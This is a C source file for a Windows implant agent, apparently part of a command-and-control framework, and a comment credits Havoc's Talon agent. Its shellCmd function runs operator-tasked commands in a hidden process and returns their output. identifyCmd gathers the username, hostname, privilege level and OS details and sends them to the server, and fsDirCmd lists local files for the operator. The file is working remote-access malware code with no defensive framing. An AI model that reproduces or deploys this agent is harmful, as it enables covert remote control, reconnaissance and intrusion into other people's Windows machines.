#include <lmcons.h>

#include <windows_utils.h>

#include <stdio.h>
#include <types.h>
#include <communication.h>
#include <commands.h>

#define COMMAND_COUNT 3

Command commands[COMMAND_COUNT] = {
  {.id = 0, .function = identifyCmd },
  {.id = 7, .function = shellCmd },
  
  // fs 
  {.id = 100, .function = fsDirCmd },
};

void executeCmd(int taskActionId, int taskId, int argc, struct TLVBuild * tlv) {

  printf("[+] Got task ID: %u\n", taskId);
  printf("    -> ActionId: %u\n", taskActionId); 
  printf("    -> ArgsBuf: %.*s (%u bytes)\n", tlv->bufsize, tlv->buf, tlv->bufsize); 

  for (int i = 0; i < COMMAND_COUNT; i++)
  {
    if (taskActionId == commands[i].id)
    {
      commands[i].function(taskId, argc, tlv);
      break;
    }
  }

}

void shellCmd(int taskId, int argc, struct TLVBuild * tlv) {
  if (argc < 1) return;
  struct TLVBuild out = allocStruct(50);

  int cmdSize = extractInt32(tlv);
  char * cmd = malloc(cmdSize + 1);
  extractBytes(tlv, cmdSize, cmd);
  cmd[cmdSize] = 0x00;
  printf("[cmd] executing: %s\n", cmd);

  /**
   * https://github.com/HavocFramework/Talon/blob/main/Agent/Source/Command.c
   */

  HANDLE hStdInPipeRead = NULL;
  HANDLE hStdInPipeWrite = NULL;
  HANDLE hStdOutPipeRead = NULL;
  HANDLE hStdOutPipeWrite = NULL;

  PROCESS_INFORMATION ProcessInfo = { };
  SECURITY_ATTRIBUTES SecurityAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
  STARTUPINFOA StartUpInfoA = { };

  if (!CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &SecurityAttr, 0))
    return;

  if (!CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &SecurityAttr, 0))
    return;

  StartUpInfoA.cb = sizeof(STARTUPINFOA);
  StartUpInfoA.dwFlags = STARTF_USESTDHANDLES;
  StartUpInfoA.hStdError = hStdOutPipeWrite;
  StartUpInfoA.hStdOutput = hStdOutPipeWrite;
  StartUpInfoA.hStdInput = hStdInPipeRead;

  if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &StartUpInfoA, &ProcessInfo))
  { sendData(taskId, "output", "Failed to create process", 0, NULL);
    return; }
  
  CloseHandle(hStdOutPipeWrite);
  CloseHandle(hStdInPipeRead);

  LPVOID pOutputBuffer = NULL;
  UCHAR buf[1025] = { 0 };
  DWORD dwBufferSize = 0;
  DWORD dwRead = 0;
  BOOL SuccessFul = FALSE;

  pOutputBuffer = LocalAlloc(LPTR, sizeof(LPVOID));

  do
  {
    SuccessFul = ReadFile(hStdOutPipeRead, buf, 1024, &dwRead, NULL);

    if (dwRead == 0) break;

    pOutputBuffer = LocalReAlloc(
      pOutputBuffer,
      dwBufferSize + dwRead,
      LMEM_MOVEABLE | LMEM_ZEROINIT
    );

    dwBufferSize += dwRead;

    memcpy(pOutputBuffer + (dwBufferSize - dwRead), buf, dwRead);
    memset(buf, 0, dwRead);
  } while (SuccessFul == TRUE);

  addBytes(&out, false, dwBufferSize, pOutputBuffer);

  memset(pOutputBuffer, 0, dwBufferSize);
  LocalFree(pOutputBuffer);
  pOutputBuffer = NULL;

  sendData(taskId, "output", "", out.bufsize, out.buf);

  CloseHandle(hStdOutPipeRead);
  CloseHandle(hStdInPipeWrite);

  free(cmd);
  free(out.buf);
}

void identifyCmd(int taskId, int argc, struct TLVBuild * tlv) {
  printf("[+] agent is identifying..\n");
  
  struct TLVBuild identifyMessage = allocStruct(50);

  char * username = malloc(UNLEN + 1);
  DWORD usernameLen = UNLEN + 1;
  GetUserNameA(username, &usernameLen);

  char * hostname = malloc(UNLEN + 1);
  DWORD hostnameLen = UNLEN + 1;
  GetComputerNameA(hostname, &hostnameLen);
  
  DWORD pid = GetProcessId(GetCurrentProcess());
  char * processName = malloc(260);
  getProcessName(pid, processName);

  OSVERSIONINFOEXW osinfo;
  agent.functions.RtlGetVersion(&osinfo);

  addString(&identifyMessage, username);
  addString(&identifyMessage, hostname);
  addByte(&identifyMessage, (char)isProcessElevated());
  addString(&identifyMessage, "windows");
  addInt32(&identifyMessage, pid);
  addString(&identifyMessage, processName);
  addInt32(&identifyMessage, osinfo.dwMajorVersion);
  addInt32(&identifyMessage, osinfo.dwMinorVersion);
  addInt32(&identifyMessage, osinfo.dwBuildNumber);

  sendData(
    taskId,
    "identify",
    "",
    identifyMessage.bufsize, 
    identifyMessage.buf
  );
  
  free(username);
  free(hostname);
  free(processName);
  free(identifyMessage.buf);
}

void fsDirCmd(int taskId, int argc, struct TLVBuild * tlv) {
  printf("[+] listing files\n");

  struct TLVBuild response = allocStruct(50);
  struct TLVBuild file_list = allocStruct(50);
  
  WIN32_FIND_DATA fdFile;
  HANDLE hFile;

  char * path = ".\\*";
  int files = 0;
  
  if (hFile = FindFirstFile(path, &fdFile)) {

    do {
      addString(&file_list, fdFile.cFileName);
      files++;
    } while (FindNextFile(hFile, &fdFile));

  };

  addInt32(&response, files);
  addBytes(&response, false, file_list.bufsize, file_list.buf);

  sendData(
    taskId,
    "output",
    "",
    response.bufsize, 
    response.buf
  );

  free(response.buf);
  free(file_list.buf);
}